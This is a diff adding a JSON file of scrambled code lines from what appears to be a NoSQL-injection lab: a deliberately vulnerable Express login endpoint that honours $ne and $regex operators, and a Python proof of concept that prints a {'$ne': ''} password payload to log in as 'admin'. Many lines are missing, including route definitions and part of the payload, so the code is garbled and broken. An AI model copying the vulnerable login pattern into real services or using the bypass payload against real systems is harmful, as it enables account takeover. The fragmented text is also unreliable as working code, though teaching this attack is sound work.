@@ -1,0 +1,257 @@
+[
+  {
+    "{":"  \"scripts\": {"
+  },
+  {
+    "{":"    \"start\": \"node server.js\""
+  },
+  {
+    "{":"  \"dependencies\": {"
+  },
+  {
+    "{":"    \"mongodb\": \"^3.6.0\""
+  },
+  {
+    "{":"  \"license\": \"MIT\""
+  },
+  {
+    "{":"}"
+  },
+  {
+    "{":"```"
+  },
+  {
+    "{":"```csv"
+  },
+  {
+    "{":"```"
+  },
+  {
+    "{":"```javascript"
+  },
+  {
+    "{":"const express = require('express');"
+  },
+  {
+    "{":"const bodyParser = require('body-parser');"
+  },
+  {
+    "{":"const app = express();"
+  },
+  {
+    "{":"app.use(bodyParser.json());"
+  },
+  {
+    "{":"app.use(bodyParser.urlencoded({ extended: true }));"
+  },
+  {
+    "{":"\/\/ Simulated MongoDB user collection"
+  },
+  {
+    "{":"const users = require('.\/users.json');"
+  },
+  {
+    "{":"\/\/ Vulnerable authentication endpoint"
+  },
+  {
+    "{":"    \/\/ VULNERABLE: Direct object injection into query"
+  },
+  {
+    "{":"    const user = users.find(u => {"
+  },
+  {
+    "{":"        return u.username === username && u.password === password;"
+  },
+  {
+    "{":"    });"
+  },
+  {
+    "{":"    if (user) {"
+  },
+  {
+    "{":"        res.json({ "
+  },
+  {
+    "{":"        });"
+  },
+  {
+    "{":"    } else {"
+  },
+  {
+    "{":"        res.json({ "
+  },
+  {
+    "{":"            message: 'Invalid credentials' "
+  },
+  {
+    "{":"        });"
+  },
+  {
+    "{":"    }"
+  },
+  {
+    "{":"});"
+  },
+  {
+    "{":"\/\/ More vulnerable endpoint that uses object comparison"
+  },
+  {
+    "{":"    const credentials = req.body;"
+  },
+  {
+    "{":"    \/\/ VULNERABLE: No validation of input structure"
+  },
+  {
+    "{":"    const user = users.find(u => {"
+  },
+  {
+    "{":"        \/\/ This allows NoSQL injection via object operators"
+  },
+  {
+    "{":"        if (typeof credentials.username === 'object') {"
+  },
+  {
+    "{":"            if (credentials.username.$ne !== undefined) {"
+  },
+  {
+    "{":"                return u.username !== credentials.username.$ne && "
+  },
+  {
+    "{":"                       (typeof credentials.password === 'object' ? "
+  },
+  {
+    "{":"                        u.password !== credentials.password.$ne : "
+  },
+  {
+    "{":"                        u.password === credentials.password);"
+  },
+  {
+    "{":"            }"
+  },
+  {
+    "{":"            if (credentials.username.$regex !== undefined) {"
+  },
+  {
+    "{":"                const regex = new RegExp(credentials.username.$regex);"
+  },
+  {
+    "{":"                return regex.test(u.username) && "
+  },
+  {
+    "{":"                       (typeof credentials.password === 'object' ?"
+  },
+  {
+    "{":"                        u.password !== credentials.password.$ne :"
+  },
+  {
+    "{":"                        u.password === credentials.password);"
+  },
+  {
+    "{":"            }"
+  },
+  {
+    "{":"        }"
+  },
+  {
+    "{":"        return u.username === credentials.username && u.password === credentials.password;"
+  },
+  {
+    "{":"    });"
+  },
+  {
+    "{":"    if (user) {"
+  },
+  {
+    "{":"        res.json({ "
+  },
+  {
+    "{":"        });"
+  },
+  {
+    "{":"    } else {"
+  },
+  {
+    "{":"        res.json({ "
+  },
+  {
+    "{":"            message: 'Invalid credentials' "
+  },
+  {
+    "{":"        });"
+  },
+  {
+    "{":"    }"
+  },
+  {
+    "{":"});"
+  },
+  {
+    "{":"const PORT = process.env.PORT || 3000;"
+  },
+  {
+    "{":"    console.log(`Authentication service running on port ${PORT}`);"
+  },
+  {
+    "{":"});"
+  },
+  {
+    "{":"```"
+  },
+  {
+    "{":"```python"
+  },
+  {
+    "{":"#!\/usr\/bin\/env python3"
+  },
+  {
+    "{":"\"\nNoSQL Injection Exploit - Authentication Bypass PoC\n\nThis script demonstrates a NoSQL injection vulnerability in the authentication service.\nThe vulnerability exists because the application accepts object-based queries without\n(not equal) to bypass authentication.\n\""
+  },
+  {
+    "{":"import json"
+  },
+  {
+    "{":"# Target user to compromise"
+  },
+  {
+    "{":"target_username = \"admin\""
+  },
+  {
+    "{":"# Exploit payload using $ne (not equal) operator"
+  },
+  {
+    "{":"# This bypasses authentication by making the query always return true:"
+  },
+  {
+    "{":"# - username: {$ne: \"\"} matches any username that is not an empty string (all users)"
+  },
+  {
+    "{":"# - password: {$ne: \"\"} matches any password that is not an empty string (all passwords)"
+  },
+  {
+    "{":"# The query will match the first user in the database that meets these conditions"
+  },
+  {
+    "{":"payload = {"
+  },
+  {
+    "{":"    \"password\": {\"$ne\": \"\"}"
+  },
+  {
+    "{":"}"
+  },
+  {
+    "{":"# Convert to JSON string for output"
+  },
+  {
+    "{":"payload_json = json.dumps(payload)"
+  },
+  {
+    "{":"# Output in required format"
+  },
+  {
+    "{":"print(f\"USERNAME: {target_username}\")"
+  },
+  {
+    "{":"print(f\"PAYLOAD: {payload_json}\")"
+  }
+]
